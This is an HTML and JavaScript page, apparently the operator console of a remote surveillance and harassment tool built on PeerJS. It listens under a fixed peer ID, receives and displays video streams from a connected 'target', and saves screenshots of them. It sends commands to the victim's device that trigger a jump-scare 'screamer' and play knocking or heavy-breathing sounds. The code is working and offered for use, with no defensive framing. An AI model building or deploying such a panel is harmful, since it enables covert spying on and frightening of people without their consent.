<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>TERMINAL v15.0</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
        #side { width: 280px; background: #0a0a0a; border-right: 2px solid #111; padding: 20px; z-index: 10; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr; gap: 10px; padding: 10px; background: #000; }
        .v-box { border: 1px solid #333; background: #050505; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; text-align: left; }
        .btn:hover { background: #0f0; color: #000; }
        .btn-red { border-color: #ff0050; color: #ff0050; }
        #st { font-size: 14px; margin-bottom: 20px; color: #0f0; }
    </style>
</head>
<body>
    <div id="side">
        <div id="st">● STATUS: <span id="st-text">READY</span></div>
        <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
        <button class="btn" onclick="takePhoto()">📸 СКРИНШОТ</button>
        <p style="color: #444; font-size: 10px;">AUDIO INJECT:</p>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
    </div>
    <div id="monitor"></div>

    <script>
        // Используем тот же ID, что и раньше, раз он работает
        const peer = new Peer('GLOBAL_TARGET_V12');
        let activeConn = null;

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('st-text').innerText = "CONNECTED";
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const monitor = document.getElementById('monitor');
                const box = document.createElement('div');
                box.className = 'v-box';
                
                const v = document.createElement('video');
                v.setAttribute('autoplay', '');
                v.setAttribute('muted', '');      // Важно: без этого будет черный экран
                v.setAttribute('playsinline', '');
                v.srcObject = stream;
                
                box.appendChild(v);
                monitor.appendChild(box);

                // Принудительный старт через скрипт
                v.play().catch(err => {
                    console.log("Автоплей заблокирован, пробуем еще раз...");
                    v.muted = true;
                    v.play();
                });

                // Подстройка сетки под 2 окна
                const count = document.querySelectorAll('video').length;
                monitor.style.gridTemplateColumns = count > 1 ? "1fr 1fr" : "1fr";
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
        function takePhoto() {
            const v = document.querySelector('video');
            if(!v) return;
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const a = document.createElement('a'); a.download = 'capture.png'; a.href = canvas.toDataURL(); a.click();
        }
    </script>
</body>
</html>
